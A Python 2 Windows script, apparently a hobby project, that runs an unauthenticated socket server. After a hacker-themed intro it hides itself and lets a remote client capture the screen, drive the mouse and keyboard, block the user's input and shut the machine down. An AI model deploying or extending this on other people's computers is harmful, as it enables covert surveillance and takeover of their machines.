import wx
from ctypes import *
import socket
import datetime
from random import randint
import os
from threading import Thread
import win32api, win32con
import time
from PIL import ImageGrab
import win32com.client
import string
import pywintypes

def piltoimage(pil, alpha=True): #Converts PIL to IMG 
        image = wx.EmptyImage(1920, 1080)
        new_image = pil.convert('RGB')
        data = new_image.tostring()
        image.SetData(data)
        return image
    


class Server(wx.Frame):
    
    def __init__(self, parent, title):
        super(Server, self).__init__(parent, title=title)
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.shell = win32com.client.Dispatch("WScript.Shell")
        
        self.s.bind(('0.0.0.0', 33000))#----------------
        self.s.listen(1)
        print "wait for connection"
        self.conn, address = self.s.accept()
        print "connected"
        
        self.SetBackgroundColour((0, 0, 0)) #מגדיר צבע רקע
        self.Maximize(True) #מסך מלא
        self.Show()
        
        self.music=wx.Sound("control.wav") #מפעיל מוזיקת פתיחה
        self.music.Play(wx.SOUND_ASYNC)
        self.caps=False
        
        self.anon = wx.StaticBitmap(self, pos=(0,0)) #מגדיר משתנים לרקעים המתחלפים
        self.broken = wx.StaticBitmap(self, pos=(0,0))
        
        self.t2=Thread(target = self.intro) #מפעיל Thread שמציג את הפתיחה
        self.t2.start()
        
        self.t1=Thread(target = self.recv) #מפעיל Thread של הלולאה הראשית
        self.t1.start()


    def intro (self): #מציג את הפתיחה
        time.sleep(23.8)
        self.w="broken.jpg"
        self.broken.SetBitmap(wx.Bitmap(self.w))
        time.sleep(1)
        time.sleep(0.75)
        self.w="background.jpg"
        self.anon.SetBitmap(wx.Bitmap(self.w))
        time.sleep(0.5)
        self.music.Stop()
        self.Hide()
 
                
    def recv(self): #הלולאה הראשית
        
        while True:
            
            self.data = self.conn.recv(10024) #משתנה שמקבל מידע מהלקוח
            
            if "screenshot" in self.data: #אם מקבל הודעה על צילום מסך
                pilImage = ImageGrab.grab() #מצלם מסך
                s = (piltoimage(pilImage)).GetData() #מעביר את התמונה למחרוזת
                self.conn.send(s)
                
            else:
                
                if self.data[0:6]=="mouse:": #מקבל הודעה על תזוזה של העכבר
                    a=self.data.split("?") #מחלץ מהמסר את המיקום החדש של העכבר
                    n=0
                    while n<len (a):
                        pos=a[n].split(":")
                        if len (pos)==3:
                            x=int(int((pos[1])))
                            y=int(int((pos[2])))
                            win32api.SetCursorPos((int(x),int(1.039*y))) #מעדכן את המיקום החדש של העכבר
                        n=n+1
                        
                else:
                    
                    if 'keyboard:' in self.data: #מקבל הודעה על לחיצה במקלדת
                        a=self.data.split(":") #מחלץ את המקש שנלחץ
                        b=a[1].split("?")[0]
                        self.SetFocus()
                        if b=='311': #לחיצה על CAPSLOCK
                            if self.caps==False:
                                self.caps=True
                            else:
                                self.caps=False
                        try: #מבצע לחיצה על המקש
                            if self.caps==False:
                                self.shell.SendKeys((chr(int(b))).lower())
                            else:
                                self.shell.SendKeys(chr(int(b)))
                        except:
                            " "
    
                if 'doubleClick' in self.data: #מקבל הודעה על לחיצה כפולה
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,0,0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,0,0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,0,0)
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,0,0)
                    
                if 'leftDown' in self.data: #מקבל הודעה שהמקש השמאלי לחוץ
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,0,0)
                    
                if 'leftUp' in self.data: #מקבל הודעה שהמקש השמאלי משוחרר
                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,0,0)
                    
                if 'lock' in self.data: #מקבל הודעה על נעילת המחשב
                    ok=windll.user32.BlockInput(True)
                    
                if 'unlock' in self.data: #מקבל הודעה על שחרור המחשב
                    ok=windll.user32.BlockInput(False)
                    
                if 'shutDown' in self.data: #מקבל הודעה על כבוי המחשב
                    os.system('shutdown -s')

                if 'exit' in self.data:
                    self.s.close()

   
                


if __name__ == '__main__':
 
	app = wx.App()
	Server(None, title='Center')
	app.MainLoop()
